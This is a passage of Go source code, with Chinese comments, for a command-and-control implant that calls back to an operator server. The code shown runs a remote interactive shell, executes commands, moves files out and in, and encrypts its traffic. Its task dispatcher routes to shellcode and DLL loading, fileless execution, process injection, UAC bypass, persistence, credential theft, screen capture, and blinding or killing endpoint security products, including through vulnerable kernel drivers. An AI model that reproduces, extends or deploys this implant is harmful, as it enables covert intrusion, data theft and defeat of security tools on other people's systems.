	if isHeavyTask(task.TaskType) {
		timeout = heavyExecTimeout
	}
	select {
	case res := <-ch:
		return res
	case <-time.After(timeout):
		return Result{TaskID: task.ID, TaskType: task.TaskType, ExitCode: -1,
			Error: "task timed out after " + timeout.String(), Output: ""}
	}
}

const (
	// execTimeout 轻任务（command/shell 等）最大执行时长。
	execTimeout = 90 * time.Second
	// heavyExecTimeout 重活任务（plugin_exe/BOF/注入等）最大执行时长，略长。
	heavyExecTimeout = 180 * time.Second
)

// isTransferTask 判断是否为依赖完整分块传输的任务（其结果不可跨断连缓存）。
func isTransferTask(taskType string) bool {
	return taskType == "file_download" || taskType == "file_upload"
}

// sendResultPayload 以同步方式回传一个已序列化的结果帧。
func sendResultPayload(resultPayload []byte) {
	resultPacket := &Packet{
		Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
		Version:   Version,
		Type:      TypeResult,
		ID:        sessionID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   resultPayload,
	}
	// 任务结果使用同步写入，确保不丢失
	sendPacketSync(resultPacket)
}

// cacheResult 写入任务结果缓存，容量上限 resultCacheMax，超限淘汰最旧。
func cacheResult(taskID uint64, payload []byte) {
	resultCacheMu.Lock()
	defer resultCacheMu.Unlock()
	if resultCache == nil {
		resultCache = make(map[uint64][]byte)
	}
	if _, ok := resultCache[taskID]; !ok {
		resultCacheOrder = append(resultCacheOrder, taskID)
	}
	resultCache[taskID] = payload
	for len(resultCacheOrder) > resultCacheMax {
		oldest := resultCacheOrder[0]
		resultCacheOrder = resultCacheOrder[1:]
		delete(resultCache, oldest)
	}
}

// clearResultCache 清空结果缓存。每次建立新连接时调用：
// 服务端重启后 taskCounter 会从 1 重新分配 task.ID，若不清缓存，
// 新任务的 task.ID 会命中旧会话缓存的错误结果 → 任务输出错位/乱序。
func clearResultCache() {
	resultCacheMu.Lock()
	defer resultCacheMu.Unlock()
	resultCache = nil
	resultCacheOrder = nil
}

// resultCacheMax 结果缓存容量：覆盖心跳超时窗口内的任务数即可。
const resultCacheMax = 256

var shellProcess *os.Process
var shellStdin io.WriteCloser
var shellStdout io.ReadCloser
var shellRunning bool
var shellCWD string // 交互式 shell 的当前工作目录（通过拦截 cd 输入近似跟踪）

// PTY 状态（Linux/macOS 生效，Windows 恒 nil）：
// 声明在 main.go 以便 cleanupShell 等公共路径引用；实现见 shell_pty_unix.go。
var ptyTty *os.File
var ptyCmd *exec.Cmd

// wsSendFrameFn WebSocket 通道上行发送函数（transport_ws.go 设置；
// 非 WS 构建为 nil，sendPacketSync 回退 TCP/HTTP 路径）。
var wsSendFrameFn func(p *Packet) bool

// mqttSendFrameFn MQTT 通道上行发送函数（transport_mqtt.go 设置；
// 非 MQTT 构建为 nil，sendPacketSync 回退 TCP/HTTP/WS 路径）。
var mqttSendFrameFn func(p *Packet) bool

func handleShellOpen(packet *Packet) {
	if shellRunning {
		shellSendOutput([]byte("[Shell already running]\n"))
		return
	}

	var req struct {
		Shell string `json:"shell"`
	}
	json.Unmarshal(packet.Payload, &req)

	shell := req.Shell
	if shell == "" {
		if runtime.GOOS == "windows" {
			shell = sysBin("cmd.exe")
		} else {
			shell = "/bin/bash"
		}
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		// 使用绝对路径启动，避免 PATH 环境变量缺失导致无法启动 shell
		switch shell {
		case "cmd", "cmd.exe":
			shell = sysBin("cmd.exe")
		case "powershell", "powershell.exe":
			shell = sysPowershell()
		}
		cmd = exec.Command(shell, "/Q")
	} else {
		// Linux/macOS：PTY 伪终端（交互模式 + 行编辑 + 全屏程序 + 输出合流），
		// 见 shell_pty_unix.go。失败时回退管道模式。
		if err := shellOpenPTY(shell); err != nil {
			shellSendOutput([]byte(fmt.Sprintf("[PTY open failed: %v]\n", err)))
			// 回退：普通管道（无交互但可用）
			cmd = exec.Command(shell, "--noediting", "--noprofile", "--norc")
		} else {
			shellProcess = ptyCmd.Process
			shellRunning = true
			if cwd, err := os.Getwd(); err == nil {
				shellCWD = cwd
			}
			shellSendOutput([]byte(fmt.Sprintf("[Shell opened: %s]\r\n", shell)))
			return
		}
	}
	cmd.SysProcAttr = getSysProcAttr()
	cmd.Env = append(os.Environ(), "TERM=xterm", "PS1=$ ")

	stdin, err := cmd.StdinPipe()
	if err != nil {
		shellSendOutput([]byte(fmt.Sprintf("[Error creating stdin: %v]\n", err)))
		return
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		shellSendOutput([]byte(fmt.Sprintf("[Error creating stdout: %v]\n", err)))
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		shellSendOutput([]byte(fmt.Sprintf("[Error creating stderr: %v]\n", err)))
		return
	}

	if err := cmd.Start(); err != nil {
		shellSendOutput([]byte(fmt.Sprintf("[Error starting shell: %v]\n", err)))
		return
	}

	shellProcess = cmd.Process
	shellStdin = stdin
	shellStdout = stdout
	shellRunning = true

	// 初始化交互式 shell 的工作目录跟踪（shell 进程默认继承植入进程的 cwd）
	if cwd, err := os.Getwd(); err == nil {
		shellCWD = cwd
	}

	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := stdout.Read(buf)
			if err != nil {
				break
			}
			if n > 0 {
				shellSendOutput(buf[:n])
			}
		}
	}()

	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := stderr.Read(buf)
			if err != nil {
				break
			}
			if n > 0 {
				shellSendOutput(buf[:n])
			}
		}
	}()

	go func() {
		cmd.Wait()
		shellRunning = false
		shellSendOutput([]byte("\r\n[Shell exited]\r\n"))
	}()

	shellSendOutput([]byte(fmt.Sprintf("[Shell opened: %s]\r\n", shell)))
}

func handleShellData(packet *Packet) {
	if !shellRunning || shellStdin == nil {
		// PTY 模式：shellRunning 已置位但 shellStdin 为 nil，走 PTY 写入
		if shellRunning && runtime.GOOS != "windows" {
			var req struct {
				Data string `json:"data"`
			}
			if err := json.Unmarshal(packet.Payload, &req); err != nil {
				return
			}
			trackShellCWD(req.Data)
			_ = shellWritePTY([]byte(req.Data))
			return
		}
		return
	}

	var req struct {
		Data string `json:"data"`
	}
	if err := json.Unmarshal(packet.Payload, &req); err != nil {
		return
	}

	data := req.Data
	if runtime.GOOS != "windows" {
		data = strings.ReplaceAll(data, "\r\n", "\n")
		data = strings.ReplaceAll(data, "\r", "\n")
	}

	// 拦截 cd 命令，跟踪交互式 shell 的当前工作目录（供文件浏览器联动）
	trackShellCWD(data)

	shellStdin.Write([]byte(data))
}

// trackShellCWD 解析写入交互式 shell 的输入，维护 shellCWD。
// 交互式 shell 是常驻进程，其工作目录只存在于子进程内部，这里通过在输入侧
// 拦截独立的 cd 命令来近似跟踪；组合命令（&&、|、> 等）不做跟踪避免误判。
func trackShellCWD(data string) {
	for _, line := range strings.Split(data, "\n") {
		line = strings.TrimSpace(strings.TrimSuffix(line, "\r"))
		if line == "" || !strings.HasPrefix(line, "cd") {
			continue
		}
		rest := strings.TrimSpace(strings.TrimPrefix(line, "cd"))
		if rest == "" {
			continue // 单独 cd：Windows 打印目录、bash 回到 $HOME，保持原目录
		}
		if strings.ContainsAny(rest, "&|><;") {
			continue // 组合命令不跟踪
		}
		rest = strings.TrimSpace(strings.TrimPrefix(rest, "/d")) // cmd 的 /d 开关
		if rest == "" {
			continue
		}
		rest = strings.Trim(rest, `"`) // 去掉引号
		newCWD := resolveShellCWD(rest)
		if newCWD != "" {
			shellCWD = newCWD
		}
	}
}

// resolveShellCWD 以当前 shellCWD 为基准解析 cd 目标目录，目录不存在时返回空串。
func resolveShellCWD(target string) string {
	var next string
	if runtime.GOOS == "windows" {
		// 绝对路径（含盘符）直接用，否则基于当前目录拼接
		if (len(target) >= 2 && target[1] == ':') || filepath.IsAbs(target) {
			next = filepath.Clean(target)
		} else {
			next = filepath.Clean(filepath.Join(shellCWD, target))
		}
	} else {
		if strings.HasPrefix(target, "~") {
			if home, err := os.UserHomeDir(); err == nil {
				next = home
			} else {
				return ""
			}
		} else if filepath.IsAbs(target) {
			next = filepath.Clean(target)
		} else {
			next = filepath.Clean(filepath.Join(shellCWD, target))
		}
	}
	if _, err := os.Stat(next); err != nil {
		return "" // 目标不存在，cd 会失败，保持原目录
	}
	return next
}

func handleShellClose() {
	cleanupShell()
}

func cleanupShell() {
	// Linux/macOS：PTY 模式直接关进程（ptyTty 的读循环会自然退出）
	if runtime.GOOS != "windows" && ptyTty != nil {
		shellClosePTY()
		ptyTty.Close()
		ptyTty = nil
	}
	if shellProcess != nil {
		if runtime.GOOS != "windows" {
			exec.Command("kill", "-9", fmt.Sprintf("-%d", shellProcess.Pid)).Run()
		}
		shellProcess.Kill()
		shellProcess.Wait()
	}
	if shellStdin != nil {
		shellStdin.Close()
	}
	shellRunning = false
	shellProcess = nil
	shellStdin = nil
	shellStdout = nil
}

func shellSendOutput(data []byte) {
	if runtime.GOOS == "windows" {
		data = gbkToUTF8(data)
	}

	payload, _ := json.Marshal(map[string]string{
		"data": string(data),
		"cwd":  shellCWD,
	})
	packet := &Packet{
		Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
		Version:   Version,
		Type:      TypeShellData,
		ID:        sessionID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	}
	sendPacket(packet)
}

// sendPacket 将控制消息入队写入（writeQueue → writeLoop → writePacket）。
func sendPacket(packet *Packet) bool {
	// WebSocket 通道：直接走 WS 帧（shell 输出等上行）。
	if wsSendFrameFn != nil {
		return wsSendFrameFn(packet)
	}
	// MQTT 通道：直接发布到上行主题。
	if mqttSendFrameFn != nil {
		return mqttSendFrameFn(packet)
	}
	if writeQueue == nil {
		return false
	}
	select {
	case writeQueue <- packet:
		return true
	default:
		return writePacket(packet) // 队列满→同步写入
	}
}

func sendPacketSync(packet *Packet) bool {
	// HTTP 轮询通道：所有上行帧统一走 HTTP POST（对应端点按帧类型路由）。
	if httpMode {
		return httpSendFrame(packet)
	}
	// WebSocket 通道：直接走 WS 帧（wsSendFrameFn 由 transport_ws.go 设置）。
	if wsSendFrameFn != nil {
		return wsSendFrameFn(packet)
	}
	// MQTT 通道：直接发布到上行主题（mqttSendFrameFn 由 transport_mqtt.go 设置）。
	if mqttSendFrameFn != nil {
		return mqttSendFrameFn(packet)
	}
	// 先排空 writeQueue 中已入队的帧，再同步写本包，保证 FIFO 顺序。
	// 否则任务结果帧会直接 writePacket 插队到尚未写出的数据帧（如大文件
	// 直传的 chunk/done 帧）之前到达服务端：服务端先完成任务、前端拿到
	// transfer_id 立即下载时文件尚未落盘，报 "transfer not found"；
	// 随后数据帧才陆续到达，临时文件仍在写入。
	if writeQueue == nil {
		return writePacket(packet)
	}
	for {
		select {
		case queued := <-writeQueue:
			writePacket(queued)
		default:
			return writePacket(packet)
		}
	}
}

func encodePacket(p *Packet) []byte {
	buf := make([]byte, HeaderSize+len(p.Payload))
	buf[0] = Magic0
	buf[1] = Magic1
	buf[2] = Magic2
	buf[3] = Magic3
	buf[4] = p.Version
	buf[5] = p.Type
	binary.BigEndian.PutUint32(buf[6:10], uint32(len(p.Payload)))
	binary.BigEndian.PutUint64(buf[10:18], p.ID)
	binary.BigEndian.PutUint64(buf[18:26], p.Timestamp)
	p.Checksum = crc32.ChecksumIEEE(p.Payload)
	binary.BigEndian.PutUint32(buf[26:30], p.Checksum)
	copy(buf[30:], p.Payload)
	return buf
}

func parsePacket(data []byte) (*Packet, error) {
	if len(data) < HeaderSize {
		return nil, fmt.Errorf("too short")
	}

	decrypted, err := decrypt(data)
	if err != nil {
		return nil, err
	}

	decompressed, err := decompress(decrypted)
	if err != nil {
		return nil, err
	}

	if len(decompressed) < HeaderSize {
		return nil, fmt.Errorf("too short after decompress")
	}

	p := &Packet{}
	copy(p.Magic[:], decompressed[0:4])
	p.Version = decompressed[4]
	p.Type = decompressed[5]
	p.Length = binary.BigEndian.Uint32(decompressed[6:10])
	p.ID = binary.BigEndian.Uint64(decompressed[10:18])
	p.Timestamp = binary.BigEndian.Uint64(decompressed[18:26])
	p.Checksum = binary.BigEndian.Uint32(decompressed[26:30])

	if len(decompressed) >= HeaderSize+int(p.Length) {
		p.Payload = decompressed[HeaderSize : HeaderSize+int(p.Length)]
	}

	return p, nil
}

func compress(data []byte) ([]byte, error) {
	// 与服务端保持一致：小数据不压缩
	if len(data) <= 1024 {
		return data, nil
	}
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	gw.Write(data)
	gw.Close()
	return buf.Bytes(), nil
}

func decompress(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return data, nil
	}
	// 与服务端保持一致：通过 gzip 魔数判断是否压缩
	if len(data) < 2 || data[0] != 0x1f || data[1] != 0x8b {
		return data, nil
	}
	gr, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	defer gr.Close()
	return io.ReadAll(gr)
}

// initAES 按最终密钥一次性构建 AES-GCM 实例，供后续所有帧加解密复用（B2），
// 避免每帧重复 aes.NewCipher + cipher.NewGCM（含 S-box 扩展与表生成，开销可观）。
// 密钥可能被尾部配置块覆盖，因此必须在 main() 完成密钥加载后调用。
func initAES() {
	aesOnce.Do(func() {
		if encryptionKey == nil || len(encryptionKey) == 0 {
			return
		}
		block, err := aes.NewCipher(encryptionKey)
		if err != nil {
			return
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return
		}
		aesgcm = gcm
		gcmNonceSz = gcm.NonceSize()
	})
}

// zeroBytes 把字节切片内容清零（用于释放敏感的密钥/凭据内存，降低内存扫描命中）。
func zeroBytes(b []byte) {
	for i := range b {
		b[i] = 0
	}
}

func encrypt(data []byte) ([]byte, error) {
	if aesgcm == nil {
		return data, nil
	}
	nonce := make([]byte, gcmNonceSz)
	io.ReadFull(cyrand.Reader, nonce)
	return aesgcm.Seal(nonce, nonce, data, nil), nil
}

func decrypt(data []byte) ([]byte, error) {
	if aesgcm == nil {
		return data, nil
	}
	if len(data) < gcmNonceSz {
		return nil, fmt.Errorf("too short")
	}
	nonce, ciphertext := data[:gcmNonceSz], data[gcmNonceSz:]
	return aesgcm.Open(nil, nonce, ciphertext, nil)
}

func generateKey() []byte {
	key := make([]byte, 32)
	for i := range key {
		key[i] = byte(rand.Intn(256))
	}
	return key
}

func generateSessionID() uint64 {
	var b [8]byte
	for i := 0; i < 8; i++ {
		b[i] = byte(time.Now().UnixNano() >> uint(i*8))
	}
	return binary.BigEndian.Uint64(b[:])
}

func executeTask(task Task) Result {
	var output string
	var exitCode int32
	var errMsg string

	switch task.TaskType {
	case "command":
		output, exitCode, errMsg = executeCommand(task.Command, task.Args)
	case "shell":
		// Parse shell command from Data JSON or Command field
		output, exitCode, errMsg = executeShellCommand(task.Command, task.Data)
	case "file_list":
		output, exitCode, errMsg = listFiles(task.Path)
	case "file_download":
		output, exitCode, errMsg = downloadFile(task.Path, task.ID, task.Data)
	case "file_upload":
		output, exitCode, errMsg = uploadFile(task.Path, task.Data)
	case "file_delete":
		output, exitCode, errMsg = deleteFile(task.Path)
	case "process_list":
		output, exitCode, errMsg = listProcesses()
	case "process_kill":
		output, exitCode, errMsg = killProcess(task.PID)
	case "bof_load":
		// 服务端 CreateBOFLoad 将参数存在 Command 字段；Args 数组仅为兼容回退
		bofArgs := task.Command
		if bofArgs == "" {
			bofArgs = strings.Join(task.Args, " ")
		}
		output, exitCode, errMsg = loadBOF(task.Data, bofArgs)
	case "plugin_exe":
		output, exitCode, errMsg = loadEXE(task.Data, strings.Join(task.Args, " "))
	case "plugin_dll":
		output, exitCode, errMsg = loadDLL(task.Data)
	case "plugin_shellcode":
		output, exitCode, errMsg = loadShellcode(task.Data)
	case "module_stomp":
		// 模块伪造：shellcode 驻留已签名 DLL .text 空洞后执行（内存隐匿 2.0）
		output, exitCode, errMsg = stompShellcode(task.Data)
	case "fileless_exec":
		// 全内存无文件执行：shellcode / BOF / DLL 三类载荷均不落盘执行
		output, exitCode, errMsg = handleFilelessExec(task.Data)
	case "tunnel":
		processTaskData(task.Data)
		return Result{TaskID: task.ID, TaskType: task.TaskType, ExitCode: 0, Output: "tunnel processed"}

	// ─── 进程注入 ────────────────────────────────────────────
	case "process_inject":
		output, exitCode, errMsg = handleProcessInject(task.Data)
	case "process_spoof":
		output, exitCode, errMsg = handleProcessSpoof(task.Data)
	case "auto_inject":
		output, exitCode, errMsg = handleAutoInject(task.Data)
	case "injection":
		output, exitCode, errMsg = handleInjection(task.Data)
	case "spawn":
		output, exitCode, errMsg = handleSpawn(task.Data)
	case "uac_bypass":
		// UAC 提权：fodhelper 触发高完整性进程，内存执行 shellcode 回连上线
		output, exitCode, errMsg = handleUACBypass(task.Data)
	case "persistence":
		output, exitCode, errMsg = handlePersistence(task.Data)
	case "exit":
		// 删除主机：服务端推送此任务令植入端停止运行，结果帧发出后主循环退出进程
		output = "implant exit acknowledged"
		exitCode = 0
		exitRequested.Store(true)

	case "credentials":
		var credReq struct {
			Action string `json:"action"`
		}
		if err := json.Unmarshal([]byte(task.Data), &credReq); err != nil {
			credReq.Action = "all"
		}
		if credReq.Action == "" {
			credReq.Action = "all"
		}
		output, exitCode, errMsg = handleCredentials(credReq.Action)
	case "screenshot":
		output, exitCode, errMsg = handleScreenshot(task.Data)
	case "screen_stream":
		// 实时屏幕流：start 启动捕获循环，stop 停止
		output, exitCode, errMsg = handleScreenStream(task.Data)
	case "relay":
		// 运行时中继控制：start 监听指定端口 / stop 停止监听
		output, exitCode, errMsg = handleRelayControl(task.Data)
	case "edr_blind":
		// EDR 失明：ntdll 脱钩 + ETW patch + Autologger 清理
		output, exitCode, errMsg = handleEDRBlind(task.Data)
	case "edr_kill":
		// EDR 击杀：按进程名终止杀软
		output, exitCode, errMsg = handleEDRKill(task.Data)
	case "byovd_load":
		// BYOVD：加载内核驱动（操作员提供 .sys）
		output, exitCode, errMsg = handleBYOVDLoad(task.Data)
	case "byovd_unload":
		// BYOVD：卸载驱动
		output, exitCode, errMsg = handleBYOVDUnload(task.Data)
	case "ppl_kill":
		// PPL 击杀：直接终止 + 驱动清除保护
		output, exitCode, errMsg = handlePPLKill(task.Data)

	case "sysinfo":
		// System information gathering via commands
		output, exitCode, errMsg = gatherSysinfo()
	case "netstat":
		// Network connections
		output, exitCode, errMsg = gatherNetstat()

	case "av_detect":
		// Security software detection
		output, exitCode, errMsg = detectSecurityProducts()

	default:
		// 防止未知任务类型/空命令假成功（旧植入端曾对 file_delete 误报成功）
		if task.Command == "" {
			output = fmt.Sprintf("Unknown task type: %s (no command provided)", task.TaskType)
			exitCode = -1
			errMsg = "unsupported task type"
		} else {
			output, exitCode, errMsg = executeCommand(task.Command, task.Args)
		}
	}

	// Windows下将输出从GBK转换为UTF-8（file_list/av_detect 除外，它们的输出本身已是 UTF-8）
	if runtime.GOOS == "windows" && output != "" && task.TaskType != "file_list" && task.TaskType != "av_detect" {
		output = string(gbkToUTF8([]byte(output)))
	}

	return Result{
		TaskID:   task.ID,
		TaskType: task.TaskType,
		ExitCode: exitCode,
		Output:   output,
		Error:    errMsg,
	}
}

// handleFilelessExec 全内存无文件执行入口。
// task.Data 为 JSON：{"kind":"shellcode|bof|dll","payload_b64":"...","args":"...","entry":"..."}
//   - shellcode：VirtualAlloc + CreateThread，全程不落盘；
//   - bof：内存 COFF 执行（Beacon Object File），不落盘；
//   - dll：反射式 PE 加载（映射 + 重定位 + 导入表修复 + 调 DllMain），不落盘、不走 LoadLibrary(路径)。
func handleFilelessExec(data string) (string, int32, string) {
	var req struct {
		Kind       string `json:"kind"`
		PayloadB64 string `json:"payload_b64"`
		Args       string `json:"args"`
		Entry      string `json:"entry"`
	}
	if err := json.Unmarshal([]byte(data), &req); err != nil {
		return "", -1, fmt.Sprintf("parse fileless_exec data failed: %v", err)
	}
	if req.PayloadB64 == "" {
		return "", -1, "missing payload_b64"
	}

	switch req.Kind {
	case "shellcode", "":
		return loadShellcode(req.PayloadB64)
	case "bof":
		return loadBOF(req.PayloadB64, req.Args)
	case "dll":
		return loadDLLMem(req.PayloadB64, req.Entry)
	default:
		return "", -1, fmt.Sprintf("unsupported fileless kind: %q", req.Kind)
	}
}

func listFiles(path string) (string, int32, string) {
	if path == "" {
		path = getDefaultDir()
		if path == "" {
			path = "."
		}
	}
	// Windows 根目录（"\"）显示所有存在的盘符，便于在 C:/D:/E: 之间切换
	if runtime.GOOS == "windows" && (path == "\\" || path == "/") {
		return listDrives()
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		return "", -1, err.Error()
	}

	var result strings.Builder
	result.WriteString(fmt.Sprintf("Directory: %s\n\n", path))
	result.WriteString("Mode          Size    Name\n")
	result.WriteString("----          ----    ----\n")

	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}

		mode := "-"
		if entry.IsDir() {
			mode = "d"
		}

		result.WriteString(fmt.Sprintf("%-4s %12d  %s\n", mode, info.Size(), entry.Name()))
	}

	return result.String(), 0, ""
}

// listDrives 枚举 Windows 上所有可访问的盘符（A:\ ~ Z:\），
// 输出格式与目录列表一致，前端按普通目录解析即可。
func listDrives() (string, int32, string) {
	var b strings.Builder
	b.WriteString("Directory: \\\n\n")
	b.WriteString("Mode          Size    Name\n")
	b.WriteString("----          ----    ----\n")
	for d := 'A'; d <= 'Z'; d++ {
		p := string(d) + ":\\"
		if _, err := os.Stat(p); err == nil {
			fmt.Fprintf(&b, "d            0  %s:\n", string(d))
		}
	}
	return b.String(), 0, ""
}

// fileChunkSize 大文件分块直传的块大小
const fileChunkSize = 1024 * 1024 // 1MB

// directTransferThreshold 超过该大小的文件改用分块直传通道,
// 避免 base64 膨胀 33% 与一次性读入内存/回传数据库的瓶颈。
const directTransferThreshold = 2 * 1024 * 1024 // 2MB

// downloadFile 大文件分块直传。taskID 用于服务端进度关联（分块 JSON 携带）。
// data 支持会话热迁移断点续传：{"resume":true,"transfer_id":"...","offset":N}
// 时复用同一 transfer_id、从 offset 处继续发送剩余分块。
func downloadFile(path string, taskID uint64, data string) (string, int32, string) {
	// 解析断点续传参数
	var resume struct {
		Resume     bool   `json:"resume"`
		TransferID string `json:"transfer_id"`
		Offset     int64  `json:"offset"`
	}
	if data != "" {
		_ = json.Unmarshal([]byte(data), &resume)
	}

	f, err := os.Open(path)
	if err != nil {
		return "", -1, err.Error()
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		return "", -1, err.Error()
	}

	// ─── 大文件：分块直传服务端磁盘 ───────────────────────
	if info.Size() > directTransferThreshold {
		transferID := fmt.Sprintf("%d-%d", os.Getpid(), time.Now().UnixNano())
		if resume.Resume && resume.TransferID != "" {
			transferID = resume.TransferID // 断点续传：复用服务端已有分块的 transfer_id
		}
		filename := filepath.Base(path)
		buf := make([]byte, fileChunkSize)
		var offset int64

		if resume.Resume && resume.Offset > 0 {
			if _, serr := f.Seek(resume.Offset, 0); serr != nil {
				return "", -1, "resume seek failed: " + serr.Error()
			}
			offset = resume.Offset
		}

		for {
			n, rerr := f.Read(buf)
			if n > 0 {
				pkt, _ := json.Marshal(map[string]interface{}{
					"transfer_id": transferID,
					"filename":    filename,
					"size":        info.Size(),
					"offset":      offset,
					"done":        false,
					"task_id":     taskID,
					"data":        base64.StdEncoding.EncodeToString(buf[:n]),
				})
				if !sendPacket(&Packet{
					Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
					Version:   Version,
					Type:      TypeFileDown,
					ID:        sessionID,
					Timestamp: uint64(time.Now().UnixMilli()),
					Payload:   pkt,
				}) {
					return "", -1, "failed to send file chunk"
				}
				offset += int64(n)
			}
			if rerr != nil {
				if rerr != io.EOF {
					return "", -1, rerr.Error()
				}
				break
			}
		}

		// 完成标记块
		donePkt, _ := json.Marshal(map[string]interface{}{
			"transfer_id": transferID,
			"filename":    filename,
			"size":        info.Size(),
			"offset":      offset,
			"done":        true,
			"task_id":     taskID,
		})
		sendPacket(&Packet{
			Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
			Version:   Version,
			Type:      TypeFileDown,
			ID:        sessionID,
			Timestamp: uint64(time.Now().UnixMilli()),
			Payload:   donePkt,
		})

		res, _ := json.Marshal(map[string]interface{}{
			"transfer_id": transferID,
			"filename":    filename,
			"size":        info.Size(),
		})
		return string(res), 0, ""
	}

	// ─── 小文件：保持原有 base64 直传 ─────────────────────
	dataBytes, err := os.ReadFile(path)
	if err != nil {
		return "", -1, err.Error()
	}
	return base64.StdEncoding.EncodeToString(dataBytes), 0, ""
}

// uploadFile 将 base64 编码的文件内容写入目标路径
func uploadFile(path string, dataB64 string) (string, int32, string) {
	if dataB64 == "" {
		return "", -1, "no data to upload"
	}
	data, err := base64.StdEncoding.DecodeString(dataB64)
	if err != nil {
		return "", -1, "invalid base64 data"
	}
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return "", -1, err.Error()
	}
	if err := os.WriteFile(path, data, 0o644); err != nil {
		return "", -1, err.Error()
	}
	return fmt.Sprintf("uploaded %d bytes to %s", len(data), path), 0, ""
}

func deleteFile(path string) (string, int32, string) {
	if path == "" {
		return "", -1, "no file path provided"
	}
	if err := os.RemoveAll(path); err != nil {
		return "", -1, err.Error()
	}
	return fmt.Sprintf("deleted %s", path), 0, ""
}

// ─── 大文件上传直传：服务端分片推送 TypeFileUp 帧，implant 落盘 ───

// uploadSession 记录一个进行中的上传会话（目标文件句柄等）
type uploadSession struct {
	file     *os.File
	path     string
	taskID   uint64
	expected int64
	received int64
}

var (
	uploadMu       sync.Mutex
	uploadSessions = make(map[string]*uploadSession)
)

// handleFileUp 处理服务端推送的 TypeFileUp 分片帧。
// 首帧（path 非空）创建目标文件，数据帧按 offset 落盘，done 帧收尾并回传结果。
func handleFileUp(packet *Packet) {
	var chunk struct {
		UploadID string `json:"upload_id"`
		TaskID   uint64 `json:"task_id"`
		Filename string `json:"filename"`
		Path     string `json:"path"`
		Size     int64  `json:"size"`
		Offset   int64  `json:"offset"`
		Done     bool   `json:"done"`
		Data     string `json:"data"`
	}
	if err := json.Unmarshal(packet.Payload, &chunk); err != nil {
		return
	}
	if chunk.UploadID == "" || strings.ContainsAny(chunk.UploadID, `/\:`) {
		return
	}

	uploadMu.Lock()
	defer uploadMu.Unlock()

	sess, ok := uploadSessions[chunk.UploadID]
	if !ok {
		// 非首帧且会话不存在：无法落盘，直接放弃
		if chunk.Done || chunk.Path == "" {
			return
		}
		// 首帧：创建目标目录与文件
		if dir := filepath.Dir(chunk.Path); dir != "" && dir != "." {
			if err := os.MkdirAll(dir, 0o755); err != nil {
				sendUpResult(chunk.TaskID, -1, "", "mkdir failed: "+err.Error())
				return
			}
		}
		f, err := os.OpenFile(chunk.Path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o644)
		if err != nil {
			sendUpResult(chunk.TaskID, -1, "", "create failed: "+err.Error())
			return
		}
		sess = &uploadSession{file: f, path: chunk.Path, taskID: chunk.TaskID, expected: chunk.Size}
		uploadSessions[chunk.UploadID] = sess
	}

	// 收尾帧：关闭文件并回传结果
	if chunk.Done {
		if err := sess.file.Sync(); err != nil {
			sess.file.Close()
			delete(uploadSessions, chunk.UploadID)
			sendUpResult(sess.taskID, -1, "", "sync failed: "+err.Error())
			return
		}
		sess.file.Close()
		delete(uploadSessions, chunk.UploadID)
		sendUpResult(sess.taskID, 0, fmt.Sprintf("uploaded %d bytes to %s", chunk.Offset, sess.path), "")
		return
	}

	// 数据帧：按 offset 写入
	data, err := base64.StdEncoding.DecodeString(chunk.Data)
	if err != nil {
		return
	}
	if _, err := sess.file.Seek(chunk.Offset, io.SeekStart); err != nil {
		return
	}
	if _, err := sess.file.Write(data); err != nil {
		return
	}
	sess.received += int64(len(data))
}

// sendUpResult 将上传任务结果以 TypeResult 帧同步回传服务端
func sendUpResult(taskID uint64, exitCode int32, output, errMsg string) {
	resultPayload, _ := json.Marshal(Result{
		TaskID:   taskID,
		TaskType: "file_upload",
		ExitCode: exitCode,
		Output:   output,
		Error:    errMsg,
	})
	sendPacketSync(&Packet{
		Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
		Version:   Version,
		Type:      TypeResult,
		ID:        sessionID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   resultPayload,
	})
}

// gatherSysinfo collects system information via shell commands
func gatherSysinfo() (string, int32, string) {
	var buf bytes.Buffer
	host, _ := os.Hostname()
	buf.WriteString(fmt.Sprintf("Hostname:     %s\n", host))
	buf.WriteString(fmt.Sprintf("OS:           %s\n", runtime.GOOS))
	buf.WriteString(fmt.Sprintf("Arch:         %s\n", runtime.GOARCH))
	buf.WriteString(fmt.Sprintf("CPUs:         %d\n", runtime.NumCPU()))
	buf.WriteString(fmt.Sprintf("PID:          %d\n", os.Getpid()))
	if path, err := os.Executable(); err == nil {
		buf.WriteString(fmt.Sprintf("ProcessPath:  %s\n", path))
	}
	if wd, err := os.Getwd(); err == nil {
		buf.WriteString(fmt.Sprintf("WorkDir:      %s\n", wd))
	}
	if u := os.Getenv("USERNAME"); u != "" {
		buf.WriteString(fmt.Sprintf("Username:     %s\n", u))
	}
	if d := os.Getenv("USERDOMAIN"); d != "" {
		buf.WriteString(fmt.Sprintf("Domain:       %s\n", d))
	}
	if c := os.Getenv("COMPUTERNAME"); c != "" {
		buf.WriteString(fmt.Sprintf("ComputerName: %s\n", c))
	}
	return buf.String(), 0, ""
}

// gatherNetstat runs netstat to get network connections
func gatherNetstat() (string, int32, string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		// 直接调用绝对路径的 netstat.exe，避免 PATH 缺失以及 cmd /c 引号解析问题
		cmd = exec.Command(sysBin("netstat.exe"), "-ano")
	} else {
		cmd = exec.Command("/bin/sh", "-c", "netstat -tulnp 2>/dev/null || netstat -an")
	}
